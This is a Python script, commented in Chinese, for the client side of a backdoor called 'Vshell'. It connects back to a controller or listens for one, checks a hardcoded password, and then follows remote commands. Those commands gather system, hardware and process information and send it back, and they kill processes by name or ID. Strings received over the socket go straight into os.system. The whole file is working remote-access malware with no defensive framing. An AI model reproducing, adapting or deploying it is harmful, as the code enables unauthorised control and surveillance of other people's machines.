#!/usr/bin/env python3
# -*- coding: utf-8 -*-
 
# 导入socket库:
import socket
import time
import os

# 变量定义
ACTIVE = 1
IP = '127.0.0.1'
PORT = 9481
PASS = 'AC131'
SYS =  None

#文字颜色
# 红色 \033[0;31;48m[!]\033[0m
# 绿色 \033[0;32;48m[+]\033[0m
# 黄色 \033[0;33;48m[-]\033[0m

# 主动连接控制端
def Active():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if s.connect_ex((IP, PORT)) != 0:
            s.close()
            time.sleep(15)
        elif PassCheck(s):
            return s
        else:
            s.close()
            time.sleep(15)

# 等待控制端连接
def Passive():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',PORT))
    s.listen(1)
    while True:
        sock, addr = s.accept()
        if PassCheck(sock):
            return sock
            
# 验证
def PassCheck(sock):
    while True:
        cmd = sock.recv(1024)
        time.sleep(1)
        if cmd.decode('utf-8') == 'Vshell P%s' %PASS:
            sock.send(b'HiAdmin')
            return True
        else:
            sock.send(b'NoAccess')
            return False

# 获取系统信息
def Getinfo(sock):
    if SYS == 'nt':
        os.system('echo nt@ > C:\\ProgramData\\info.txt')
        os.system('systeminfo >> C:\\ProgramData\\info.txt')
        f = open('C:\\ProgramData\\info.txt','r')
        data = f.read()
        f.close()
        data = data.encode('utf-8')
        sock.send(data)
        sock.send(b'End')
        os.system('del /f /q C:\\ProgramData\\info.txt')
        return
    else:
        os.system('echo posix@ > info.txt')
        os.system('uname -a >> info.txt')
        f = open('info.txt','r')
        data = f.read()
        f.close()
        data = data.encode('utf-8')
        sock.send(data)
        sock.send(b'End')
        os.system('rm -f info.txt')
        return

# 获取更多信息
def GetMoreinfo(sock,target):
    if target == 'CPU':
        os.system('cat /proc/cpuinfo >> info.txt')
    elif target == 'MEM':
        os.system('cat /proc/meminfo >> info.txt')
    elif target == 'USB':
        os.system('lsusb -tv >> info.txt')
    f = open('info.txt','r')
    data = f.read()
    f.close()
    data = data.encode('utf-8')
    sock.send(data)
    sock.send(b'End')
    os.system('rm -f info.txt')

# 进程信息
def Process(sock):
    if SYS == 'nt':
        os.system('tasklist >> C:\\ProgramData\\info.txt')
        f = open('C:\\ProgramData\\info.txt','r')
        data = f.read()
        f.close()
        data = data.encode('utf-8')
        sock.send(data)
        sock.send(b'End')
        os.system('del /f /q C:\\ProgramData\\info.txt')
        return
    else:
        os.system('ps -aux >> info.txt')
        f = open('info.txt','r')
        data = f.read()
        f.close()
        data = data.encode('utf-8')
        sock.send(data)
        sock.send(b'End')
        os.system('rm -f info.txt')
        return

# Kill进程 by Name
def KillName(sock):
    d = sock.recv(1024)
    name = d.decode('utf-8')
    if SYS == 'nt':
        os.system('taskkill /f /im %s' %name)
    return

# Kill进程 by ID
def KillId(sock):
    d = sock.recv(1024)
    id = d.decode('utf-8')
    if SYS == 'nt':
        os.system('taskkill /f /pid %s' %id)
    else:
        os.system('kill -9 %s' %id)
    return

# 主程序
if ACTIVE == 0:
    s = Passive()
else:
    s = Active()
SYS = os.name
while True:
    # 每次最多接收1k字节:
    d = s.recv(1024)
    if d == b'0':
        s.send(b'Bye')
        break
    elif d == b'1':
        Getinfo(s)
    elif d == b'1x01':
        GetMoreinfo(s,'CPU')
    elif d == b'1x02':
        GetMoreinfo(s,'MEM')
    elif d == b'1x03':
        GetMoreinfo(s,'USB')
    elif d == b'2':
        Process(s)
    elif d == b'2x01':
        KillName(s)
    elif d == b'2x02':
        KillId(s)
    elif d == b'2x03':
        break
s.close()